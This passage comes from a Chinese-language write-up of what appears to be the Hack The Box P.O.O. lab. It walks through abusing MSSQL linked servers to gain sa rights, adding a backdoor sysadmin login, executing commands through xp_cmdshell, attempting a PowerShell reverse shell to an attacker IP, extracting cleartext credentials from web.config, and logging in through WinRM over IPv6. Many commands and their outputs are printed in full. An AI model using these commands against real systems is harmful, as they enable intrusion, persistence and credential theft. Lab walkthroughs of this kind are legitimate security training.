) at [COMPATIBILITY\POO_CONFIG];
```

<font style="color:rgb(13, 13, 13);">输出：</font>

```plain
sa
```

---

### <font style="color:rgb(13, 13, 13);">七、漏洞原理详解（整题核心）</font>
#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 发生了什么？（一定要写清楚）</font>
<font style="color:rgb(13, 13, 13);">这里实际发生的是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">两次跳转</font>**<font style="color:rgb(13, 13, 13);">：</font>

```plain
external_user
 →（Linked）→ POO_CONFIG（internal_user）
   →（Linked）→ POO_PUBLIC（sa）
```

#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 根本原因</font>
<font style="color:rgb(13, 13, 13);">管理员错误地配置了</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">双向 Linked Server</font>**<font style="color:rgb(13, 13, 13);">：</font>

| **<font style="color:rgb(13, 13, 13);">方向</font>** | **<font style="color:rgb(13, 13, 13);">使用账号</font>** |
| --- | --- |
| <font style="color:rgb(13, 13, 13);">POO_PUBLIC → POO_CONFIG</font> | <font style="color:rgb(13, 13, 13);">internal_user（低权）</font> |
| <font style="color:rgb(13, 13, 13);">POO_CONFIG → POO_PUBLIC</font> | **<font style="color:rgb(13, 13, 13);">sa（高权）</font>** |


<font style="color:rgb(13, 13, 13);">原本假设：</font>

**<font style="color:rgb(13, 13, 13);">“只有内部服务器才会使用这个链接”</font>**

<font style="color:rgb(13, 13, 13);">但实际上：</font>

**外部用户可以借道 POO_CONFIG，再“弹回” POO_PUBLIC**

---

### <font style="color:rgb(13, 13, 13);">八、确认已获得服务器级最高权限</font>
#### <font style="color:rgb(13, 13, 13);">7. 查看 sa 权限</font>
```plain
EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```

```plain
EXECUTE (
  'EXECUTE (
     ''SELECT entity_name, permission_name 
       FROM fn_my_permissions(NULL, ''''SERVER'''');''
   ) at [COMPATIBILITY\POO_PUBLIC]'
) at [COMPATIBILITY\POO_CONFIG];
```

<font style="color:rgb(13, 13, 13);">输出包含：</font>

```plain
SQL (external_user  dbo@POO_PUBLIC)> EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
entity_name   permission_name                   
-----------   -------------------------------   
server        CONNECT SQL                       
server        SHUTDOWN                          
server        CREATE ENDPOINT                   
server        CREATE ANY DATABASE               
server        CREATE AVAILABILITY GROUP         
server        ALTER ANY LOGIN                   
server        ALTER ANY CREDENTIAL              
server        ALTER ANY ENDPOINT                
server        ALTER ANY LINKED SERVER           
server        ALTER ANY CONNECTION              
server        ALTER ANY DATABASE                
server        ALTER RESOURCES                   
server        ALTER SETTINGS                    
server        ALTER TRACE                       
server        ALTER ANY AVAILABILITY GROUP      
server        ADMINISTER BULK OPERATIONS        
server        AUTHENTICATE SERVER               
server        EXTERNAL ACCESS ASSEMBLY          
server        VIEW ANY DATABASE                 
server        VIEW ANY DEFINITION               
server        VIEW SERVER STATE                 
server        CREATE DDL EVENT NOTIFICATION     
server        CREATE TRACE EVENT NOTIFICATION   
server        ALTER ANY EVENT NOTIFICATION      
server        ALTER SERVER STATE                
server        UNSAFE ASSEMBLY                   
server        ALTER ANY SERVER AUDIT            
server        CREATE SERVER ROLE                
server        ALTER ANY SERVER ROLE             
server        ALTER ANY EVENT SESSION           
server        CONNECT ANY DATABASE              
server        IMPERSONATE ANY LOGIN             
server        SELECT ALL USER SECURABLES        
server        CONTROL SERVER   
```

#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">CONTROL SERVER</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">≈</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">sysadmin</font>**`
+ <font style="color:rgb(13, 13, 13);">等价于</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">数据库最高权限</font>**
+ <font style="color:rgb(13, 13, 13);">可开启</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">xp_cmdshell</font>**`<font style="color:rgb(13, 13, 13);">，执行系统命令</font>

## 权限维持
```plain
SQL> EXECUTE('EXECUTE(''CREATE LOGIN god WITH PASSWORD = ''''1qaz@wsx'''';'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
SQL> EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''god'''', ''''sysadmin'''''') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
```

**👉**** 每多一层字符串执行，引号数量 × 2**

| 执行层级 | 实际写法 |
| --- | --- |
| 真正 SQL | `'god'` |
| 一层 EXEC | `''god''` |
| 两层 EXEC | `''''god''''` |


现在我可以用这个新的管理员账号登录了：

```plain
┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ impacket-mssqlclient intranet.poo/god:1qaz@wsx@10.13.38.11
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017  (14.0.2056)
[!] Press help for extra shell commands
SQL (god  dbo@master)>
```

## Getflag
```plain
SQL (god  dbo@master)> SELECT name FROM sys.databases;
name         
----------   
master       
tempdb       
model        
msdb         
POO_PUBLIC   
flag   
```

```plain
SQL (god  dbo@master)> USE flag;
ENVCHANGE(DATABASE): Old Value: master, New Value: flag
INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'flag'.

SQL (god  dbo@flag)> SELECT * FROM INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
flag   //数据库    dbo          flag //表名  b'BASE TABLE' 

SQL (god  dbo@flag)> SELECT * FROM flag;  //直接查询表
flag                                       
----------------------------------------   
b'POO{88d829eb39f2d11697e689d779810d42}'   
```

补充:要在 MSSQL 中查询不同的数据库，可以使用 `[server].[db].[schema].[table]` 

```plain
SQL (god  dbo@flag)> select * from flag.dbo.flag;
flag                                       
----------------------------------------   
b'POO{88d829eb39f2d11697e689d779810d42}'   
```

## xp_cmdshell
### 执行命令
```c
SQL (god  dbo@flag)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$poo_public   
NULL 
```

可以看见我们成功执行命令

```c
SQL (god  dbo@master)> EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system("cmd /c whoami")';

INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
compatibility\poo_public01

Express Edition will continue to be enforced.
```



环境中存在python，借此反弹shell

```c
EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient(''10.10.16.26'',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+''PS ''+(pwd).Path+''> '';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

```c
SQL (god  dbo@master)> EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient(''10.10.16.26'',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+''PS ''+(pwd).Path+''> '';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
output                                                                                                           
--------------------------------------------------------------------------------------------------------------   
New-Object : Exception calling ".ctor" with "2" argument(s): "An attempt was made to access a socket in a way    
forbidden by its access permissions 10.10.16.26:4444"                                                            
At line:1 char:9                                                                                                 
+ $client=New-Object System.Net.Sockets.TCPClient('10.10.16.26',4444);$ ...                                      
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                            
    + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException                      
    + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand    
                                                                                                                 
You cannot call a method on a null-valued expression.                                                            
At line:1 char:69                                                                                                
+ ... ets.TCPClient('10.10.16.26',4444);$stream=$client.GetStream();[byte[] ...                                  
+                                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~                                              
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException                                         
    + FullyQualifiedErrorId : InvokeMethodOnNull                                                                 
                                                                                                                 
You cannot call a method on a null-valued expression.                                                            
At line:1 char:133                                                                                               
+ ... =0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0) ...                                  
+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                              
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException                                         
    + FullyQualifiedErrorId : InvokeMethodOnNull                                                                 
                                                                                                                 
You cannot call a method on a null-valued expression.                                                            
At line:1 char:449                                                                                               
+ ... .Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()                                      
+                                                           ~~~~~~~~~~~~~~~                                      
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException                                         
    + FullyQualifiedErrorId : InvokeMethodOnNull                                                                 
                                                                                                                 
NULL      
```

原因是`**<font style="background-color:rgb(236, 236, 236);">NT SERVICE\MSSQL$POO_PUBLIC</font>**`**<font style="color:rgb(13, 13, 13);"> 这个服务账户被限制了主动出网</font>**

## <font style="color:rgb(13, 13, 13);">提权</font>
```c
SQL (god  dbo@master)> EXEC xp_cmdshell 'whoami /priv';
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL  

SQL (god  dbo@master)> EXEC xp_cmdshell 'whoami /groups';
output                                                                                                                  
---------------------------------------------------------------------------------------------------------------------   
NULL                                                                                                                    
GROUP INFORMATION                                                                                                       
-----------------                                                                                                       
NULL                                                                                                                    
Group Name                           Type             SID          Attributes                                           
==================================== ================ ============ ==================================================   
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                      
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group   
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group   
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group   
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group   
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group   
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group   
NULL    

SQL (god  dbo@master)> EXEC xp_cmdshell 'dir C:\inetpub';
output                                               
--------------------------------------------------   
 Volume in drive C has no label.                     
 Volume Serial Number is C675-9954                   
NULL                                                 
 Directory of C:\inetpub                             
NULL                                                 
12/13/2019  03:58 AM    <DIR>          .             
12/13/2019  03:58 AM    <DIR>          ..            
12/13/2019  03:58 AM    <DIR>          custerr       
07/12/2024  01:02 PM    <DIR>          history       
12/13/2019  04:01 AM    <DIR>          logs          
12/13/2019  04:01 AM    <DIR>          temp          
12/13/2019  04:01 AM    <DIR>          wwwroot       
               0 File(s)              0 bytes        
               7 Dir(s)   6,030,438,400 bytes free   
NULL                        
```

### C:\inetpub
<font style="color:rgb(13, 13, 13);">这是 </font>IIS 的默认根目录

<font style="color:rgb(13, 13, 13);">在 Windows 上，只要装了 IIS（哪怕只是：</font>

+ <font style="color:rgb(13, 13, 13);">Web 服务</font>
+ <font style="color:rgb(13, 13, 13);">ASP.NET</font>
+ <font style="color:rgb(13, 13, 13);">Web 管理组件）</font>

<font style="color:rgb(13, 13, 13);">系统</font>**<font style="color:rgb(13, 13, 13);">默认就会创建</font>**<font style="color:rgb(13, 13, 13);">：</font>

```plain
C:\inetpub\
└── wwwroot\
```

<font style="color:rgb(13, 13, 13);">哪怕网站后来换路径，这个目录也</font>**<font style="color:rgb(13, 13, 13);">经常还在</font>**<font style="color:rgb(13, 13, 13);">。</font>

<font style="color:rgb(13, 13, 13);">根据我们80端口存在/admin路由需要登录</font>

### <font style="color:rgb(13, 13, 13);">web.config  </font>
`web.config` 是 **ASP.NET 网站的配置文件**，作用范围是：

+ 当前目录
+ 以及所有子目录（可继承）

IIS 在处理 Web 请求时，会**自动读取并应用它里面的配置**。

📍 放在 `C:\inetpub\wwwroot\`  
说明它是 **整个网站根级别的配置文件**。

#### 1️⃣ 数据库连接字符串（非常关键）
```plain
<connectionStrings>
  <add name="DefaultConnection"
       connectionString="Server=localhost;Database=xxx;User Id=xxx;Password=xxx;" />
</connectionStrings>
```

👉 这也是为什么 **它经常被严防死守**。

---

#### 2️⃣ 身份验证 / 授权方式
```plain
<authentication mode="Forms" />
<authorization>
  <deny users="?" />
</authorization>
```

控制：

+ 是否需要登录
+ 匿名用户能不能访问

---

#### 3️⃣ IIS / ASP.NET 行为控制
比如：

+ 自定义错误页
+ 请求大小限制
+ 模块 / 处理程序映射
+ 调试开关（`debug="true"`）

---

#### 4️⃣ App Pool / 运行身份相关设置
间接影响：

+ 网站用 **哪个 Windows 用户** 在跑
+ 能访问哪些文件 / 资源

### 尝试读取
```plain
SQL (god  dbo@master)> EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';
output              
-----------------   
Access is denied.   
NULL      
```

`**web.config**`** 的默认权限是：**

+ ✔ IIS App Pool 用户（如 `IIS APPPOOL\xxx`）
+ ✔ Administrators
+ ❌ 普通服务账号
+ ❌ SQL Server 服务账号

### **<font style="color:rgb(13, 13, 13);">sp_execute_external_script</font>**
<font style="color:rgb(13, 13, 13);">在 MSSQL 的知识体系里，  
</font>**<font style="color:rgb(13, 13, 13);">只有 3 种东西能直接碰 OS：</font>**

| **<font style="color:rgb(13, 13, 13);">方法</font>** | **<font style="color:rgb(13, 13, 13);">执行身份</font>** |
| --- | --- |
| <font style="color:rgb(13, 13, 13);">xp_cmdshell</font> | <font style="color:rgb(13, 13, 13);">SQL Server 服务账户</font> |
| <font style="color:rgb(13, 13, 13);">CLR</font> | <font style="color:rgb(13, 13, 13);">AppDomain / 服务账户</font> |
| **<font style="color:rgb(13, 13, 13);">sp_execute_external_script</font>** | **<font style="color:rgb(13, 13, 13);">独立 Launchpad 进程</font>** |


<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">只有第三个“身份不一样”</font>**

>  因为 `sp_execute_external_script` 从设计之初就不是“SQL Server 的一部分”，  
而是一个“被 SQL Server 调用的外部计算子系统”，  
所以它必须、也只能用“不同的 Windows 身份”运行。  
>

### <font style="color:rgb(56, 58, 66);background-color:rgb(249, 249, 249);">poo_public01</font>
```plain
SQL (god  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
compatibility\poo_public01

Express Edition will continue to be enforced.
```

现在我可以以 `poo_public01` 身份运行。

## <font style="color:rgb(13, 13, 13);">web.config  </font>
```plain
SQL (god  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap
                fileExtension=".DS_Store"
                mimeType="application/octet-stream"
            />
        </staticContent>
        <!--
        <authentication mode="Forms">
            <forms name="login" loginUrl="/admin">
                <credentials passwordFormat = "Clear">
                    <user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    />
                </credentials>
            </forms>
        </authentication>
        -->
    </system.webServer>
</configuration>

Express Edition will continue to be enforced.
```

## Getflag
我们成功获得Administrator/EverybodyWantsToWorkAtP.O.O. 凭据

![](/image/prolabs/P.O.O-6.png)

```plain
"I can't go back to yesterday, because i was a different person then..."
- Alice in Wonderland
Flag : POO{4882bd2ccfd4b5318978540d9843729f} 
```

拿到flag

## ipconfig
```plain
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("ipconfig");';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::1001
   Link-local IPv6 Address . . . . . : fe80::a7df:45a3:ed4d:2e09%8
   IPv4 Address. . . . . . . . . . . : 10.13.38.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : dead:beef::1
                                       10.13.38.2

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.20.128.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Express Edition will continue to be enforced.

```

## netstat -ano
```plain
SQL (god  dbo@master)> EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("netstat -ano");';         
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       968
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4608
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:41433          0.0.0.0:0              LISTENING       4572
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       536
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1216
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1648
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2392
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       680
  TCP    10.13.38.11:139        0.0.0.0:0              LISTENING       4
  TCP    10.13.38.11:1433       10.10.16.26:34416      ESTABLISHED     4608
  TCP    127.0.0.1:49670        0.0.0.0:0              LISTENING       4608
  TCP    127.0.0.1:49670        127.0.0.1:49719        ESTABLISHED     4608
  TCP    127.0.0.1:49719        127.0.0.1:49670        ESTABLISHED     5968
  TCP    127.0.0.1:50280        0.0.0.0:0              LISTENING       4608
  TCP    127.0.0.1:50311        0.0.0.0:0              LISTENING       4572
  TCP    172.20.128.101:139     0.0.0.0:0              LISTENING       4
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       968
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:1433              [::]:0                 LISTENING       4608
  TCP    [::]:5357              [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:41433             [::]:0                 LISTENING       4572
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       536
  TCP    [::]:49665             [::]:0                 LISTENING       1216
  TCP    [::]:49666             [::]:0                 LISTENING       1648
  TCP    [::]:49667             [::]:0                 LISTENING       688
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
  TCP    [::]:49668             [::]:0                 LISTENING       2392
  TCP    [::]:49669             [::]:0                 LISTENING       688
  TCP    [::]:49673             [::]:0                 LISTENING       680
  TCP    [::1]:50280            [::]:0                 LISTENING       4608
  TCP    [::1]:50311            [::]:0                 LISTENING       4572
  UDP    0.0.0.0:123            *:*                                    656
  UDP    0.0.0.0:500            *:*                                    2632
  UDP    0.0.0.0:1434           *:*                                    2936
  UDP    0.0.0.0:3702           *:*                                    2412
  UDP    0.0.0.0:3702           *:*                                    2412
  UDP    0.0.0.0:4500           *:*                                    2632
  UDP    0.0.0.0:5353           *:*                                    1192
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
  UDP    0.0.0.0:5355           *:*                                    1192
  UDP    0.0.0.0:62879          *:*                                    2412
  UDP    10.13.38.11:137        *:*                                    4
  UDP    10.13.38.11:138        *:*                                    4
  UDP    127.0.0.1:50940        *:*                                    688
  UDP    127.0.0.1:56197        *:*                                    2372
  UDP    127.0.0.1:64651        *:*                                    1464
  UDP    172.20.128.101:137     *:*                                    4
  UDP    172.20.128.101:138     *:*                                    4
  UDP    [::]:123               *:*                                    656
  UDP    [::]:500               *:*                                    2632
  UDP    [::]:1434              *:*                                    2936
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
  UDP    [::]:3702              *:*                                    2412
  UDP    [::]:3702              *:*                                    2412
  UDP    [::]:4500              *:*                                    2632
  UDP    [::]:5353              *:*                                    1192
  UDP    [::]:5355              *:*                                    1192
  UDP    [::]:62880             *:*                                    2412

Express Edition will continue to be enforced.
```

## 5985
### 监听规则
```plain
TCP    0.0.0.0:5985      0.0.0.0:0      LISTENING       4
TCP    [::]:5985         [::]:0         LISTENING       4
```

首先，主机正在监听 WinRM，TCP 端口 5985，同时支持 IPv4 和 IPv6：

但是我们通过nmap的ipv4扫描并没有探测到5985

Windows 防火墙是 **分 IPv4 / IPv6 / Profile（Domain / Private / Public）** 的。

非常常见的情况是：

+ WinRM 默认规则：
    - ✔ 允许 **IPv6**
    - ❌ 拒绝 **IPv4（Public profile）**

所以尝试能不能通过ipv6访问到5985端口

### nmap扫描
```plain
┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ nmap -6 -Pn -sT -p 5985 fe80::a7df:45a3:ed4d:2e09%8 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-03 12:02 CST
Nmap scan report for fe80::a7df:45a3:ed4d:2e09
Host is up.

PORT     STATE    SERVICE
5985/tcp filtered wsman

Nmap done: 1 IP address (1 host up) scanned in 18.53 seconds



┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ nmap -6 -Pn -sT -p 5985 dead:beef::1001             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-03 12:03 CST
Nmap scan report for dead:beef::1001
Host is up (0.33s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 16.86 seconds
```

>  尽管 WinRM 服务通过 HTTP.sys 在 IPv4 与 IPv6 上均处于监听状态，但 Windows 防火墙对不同地址族与 IPv6 作用域实施了差异化策略。  
实测表明，IPv4 与 IPv6 link-local（fe80::/10）入站连接被静默过滤，而 IPv6 Global/ULA 地址（dead:beef::1001）上的 TCP 5985 明确放行，导致 WinRM 服务在 IPv6 Global 网络中可被远程访问。  
>
> 补充:Link-local 默认不允许跑管理服务
>

# dead:beef::1001 
通过我们在web.config拿到的凭据尝试登录Administrator/EverybodyWantsToWorkAtP.O.O. 

## 通过evil-winrm连接
**IPv6 地址在 URL 中必须用方括号 **`**[]**`** 包起来  **

```plain
┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ evil-winrm -i [dead:beef::1001] -u Administrator -p EverybodyWantsToWorkAtP.O.O. 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unable to parse authorization header. Headers: {"Content-Type"=>"text/html; charset=us-ascii", "Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Tue, 03 Feb 2026 04:12:08 GMT", "Connection"=>"close", "Content-Length"=>"334"} 
Body: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">                       
<HTML><HEAD><TITLE>Bad Request</TITLE>                     
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>                                         
<BODY><h2>Bad Request - Invalid Hostname</h2>              
<hr><p>HTTP Error 400. The request hostname is invalid.</p>
</BODY></HTML>                                             
 (400).                                                    
                                        
Error: Exiting with code 1
```

## **host 参数不支持 IPv6 literal**
### 用 **hostname**，让系统去解析 IPv6
你已经有这个 IPv6：

```plain
dead:beef::1001
```

### 1️⃣ Kali 上加 hosts（你之前其实已经走到这一步了）
```plain
sudo nano /etc/hosts
```

加一行：

```plain
dead:beef::1001   poo.local
```

---

### 2️⃣ 用名字连（不要再传 IPv6）
```plain
evil-winrm -i poo.local -u Administrator -p EverybodyWantsToWorkAtP.O.O.
```

evil-winrm 内部会变成：

```plain
http://poo.local:5985/wsman
```

```plain
┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ evil-winrm -i poo.local -u Administrator -p EverybodyWantsToWorkAtP.O.O.
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
POO{ff87c4fe10e2ef096f9a96a01c646f8f}
```

## systeminfo
```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> systeminfo

Host Name:                 COMPATIBILITY
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00520-27817-AA781
Original Install Date:     12/12/2019, 6:07:48 PM
System Boot Time:          2/3/2026, 5:03:59 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              4 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
                           [03]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
                           [04]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     8,191 MB
Available Physical Memory: 5,366 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 6,559 MB
Virtual Memory: In Use:    2,912 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    intranet.poo
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.13.38.11
                                 [02]: fe80::a7df:45a3:ed4d:2e09
